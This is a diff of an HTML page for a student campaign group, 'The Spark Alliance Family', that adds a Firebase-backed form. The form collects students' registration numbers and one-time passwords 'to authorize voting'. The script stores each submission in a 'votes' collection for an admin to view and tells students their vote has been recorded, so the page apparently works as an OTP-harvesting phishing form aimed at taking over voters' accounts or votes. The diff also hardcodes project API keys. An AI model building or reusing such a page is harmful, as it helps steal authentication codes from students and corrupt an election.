@@ -4,34 +4,51 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>THE SPARK ALLIANCE FAMILY</title>
-    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="CSS/style.css">
     <link rel="icon" href="Spark Alliance.jpeg" type="image/x-icon">
 </head>
 <body>
     <div class="container">
         <header>
-            <img src="img/Spark Alliance.jpeg" alt="SPARK ALLIANCE" class="logo">
+            <img src="IMG/Spark Alliance.jpeg" alt="SPARK ALLIANCE" class="logo">
             <h1>THE SPARK ALLIANCE FAMILY</h1>
             <h2>WINNING TEAM</h2>
         </header>
         
         <section class="main-content">
-            <!-- <img src="elvis_mutai.jpg" alt="Elvis Mutai" class="candidate-img"> -->
             <h3 class="slogan">"Luck is what happens when preparation meets opportunity"</h3>
             <p class="independent">It Will Happen</p>
             <h2 class="change">TEAM OKEYO CLINTON</h2>
         </section>
         
         <section class="form-section">
-            <h2>Fill In The Following</h2>
-            <form action="https://api.web3forms.com/submit" method="POST">
-                <input type="hidden" name="access_key" value="de1cf986-a9ce-4cca-9e36-4d53abaf2ae3">
-                <input type="text" name="text" placeholder="Enter your school ie SPAS,Engeneering,Business,Education,Health Science" required>
-                <input type="text" name="text" placeholder="Enter your registration number" required>
-                <input type="text" name="text" placeholder="Enter your OTP" required><br>
-                <button type="submit">Submit</button>
+            <h2>Submit Your OTP Code</h2>
+            <p class="form-description">Enter your department and OTP to authorize voting</p>
+            
+            <form id="otpForm">
+                <select id="department" name="department" required>
+                    <option value="" disabled selected>Select Your Department</option>
+                    <option value="SPAS">SPAS - School of Pure and Applied Sciences</option>
+                    <option value="EDU">EDU - Education</option>
+                    <option value="BUS">BUS - Business</option>
+                    <option value="ENG">ENG - Engineering</option>
+                    <option value="SHS">SHS - Senior High School</option>
+                </select>
+                
+                <input type="text" id="regNo" name="reg_no" placeholder="Enter your registration number" required>
+                <input type="text" id="otp" name="otp" placeholder="Enter your OTP" required>
+                
+                <button type="submit" id="submitBtn">Submit</button>
                 <button type="reset">Reset</button>
             </form>
+            
+            <!-- Alert Messages -->
+            <div id="alertContainer"></div>
+        </section>
+        
+        <!-- Admin Login Link -->
+        <section class="admin-link">
+            <a href="login.html">Admin Login</a>
         </section>
         
     </div>
@@ -40,5 +57,100 @@
         <p>The Spark Alliance || Copyright &copy;</p>
     </footer>
     
+    <!-- Firebase V9 Modular SDK -->
+    <script type="module">
+        // =====================================================
+        // FIREBASE CONFIGURATION
+        // =====================================================
+        // Replace these with your actual Firebase credentials
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+                apiKey: "AIzaSyAqaaLWhpXmuFN1zVwciTictlkj-4BJe8c",
+                authDomain: "spark-alliance.firebaseapp.com",
+                projectId: "spark-alliance",
+                storageBucket: "spark-alliance.firebasestorage.app",
+                messagingSenderId: "741055626542",
+                appId: "1:741055626542:web:b09767007d9817507a8ebf",
+                measurementId: "G-K2QQQDZSM8"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        
+        // =====================================================
+        // FORM SUBMISSION HANDLER
+        // =====================================================
+        const form = document.getElementById('otpForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const alertContainer = document.getElementById('alertContainer');
+        
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Disable button during submission
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+            
+            // Get form values
+            const department = document.getElementById('department').value;
+            const regNo = document.getElementById('regNo').value.trim();
+            const otp = document.getElementById('otp').value.trim();
+            
+            try {
+                // Add document to Firestore
+                const docRef = await addDoc(collection(db, "votes"), {
+                    department: department,
+                    reg_no: regNo,
+                    otp: otp,
+                    status: "pending",
+                    createdAt: serverTimestamp()
+                });
+                
+                console.log("Document written with ID: ", docRef.id);
+                
+                // Show success message
+                showAlert('success', 'OTP submitted successfully! Your vote has been recorded.');
+                
+                // Reset form
+                form.reset();
+                
+            } catch (error) {
+                console.error("Error adding document: ", error);
+                
+                // Show error message
+                showAlert('error', 'Failed to submit OTP. Please try again.');
+            } finally {
+                // Re-enable button
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+            }
+        });
+        
+        // =====================================================
+        // ALERT FUNCTION
+        // =====================================================
+        function showAlert(type, message) {
+            const alertClass = type === 'success' ? 'alert-success' : 'alert-error';
+            const alertHTML = `
+                <div class="alert ${alertClass}">
+                    ${message}
+                    <button class="alert-close" onclick="this.parentElement.remove()">&times;</button>
+                </div>
+            `;
+            
+            alertContainer.innerHTML = alertHTML;
+            
+            // Auto-remove success alerts after 5 seconds
+            if (type === 'success') {
+                setTimeout(() => {
+                    const alert = alertContainer.querySelector('.alert');
+                    if (alert) alert.remove();
+                }, 5000);
+            }
+        }
+    </script>
 </body>
 </html>
